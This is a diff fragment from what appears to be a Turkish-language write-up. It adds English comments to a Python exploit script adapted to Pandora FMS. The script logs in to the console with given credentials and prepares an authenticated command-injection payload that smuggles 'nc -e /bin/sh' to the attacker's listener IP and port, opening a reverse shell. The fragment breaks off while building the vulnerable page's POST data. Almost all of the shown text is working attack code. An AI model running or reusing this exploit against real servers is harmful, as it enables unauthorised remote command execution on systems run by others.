@@ -138,30 +138,36 @@ exploit kodunu PANDORAFMS uygulamasına göre uyarladım ve sonuç olarak çalı
 import requests
 import sys
 
-if len(sys.argv) < 6:
+ #Check if all parameters are setted.
+if len(sys.argv) < 6:   
 	print "Usage: ./exploit.py <http://url> <username> <password> <listenerIP> <listenerPort>"
 	exit()
 
+ #Set variables
 url = sys.argv[1]
 user = sys.argv[2]
 password = sys.argv[3]
 payload = '";nc -e /bin/sh ' + sys.argv[4] + ' ' + sys.argv[5] + ' ' + '#'
 
+#POST variables for login
 login = {
 	'nick':user,
 	'pass':password,
 	'login_button':'Login'
 }
+ #Login and get session
 req = requests.Session()
 print "Sendin login request ..."
 login = req.post(url+"/pandora_console/index.php?login=1", data=login)
 
+#Check if login is succesfull.
 if login.status_code != 200:
 	print "[-] Seems like credentials are wrong."
 	exit()
 else:
 	print "[+] Succesfully logged in !"
 
+#Post variables for vulnerable page.
 payload = {
 	'date':"",
 	'time':"",
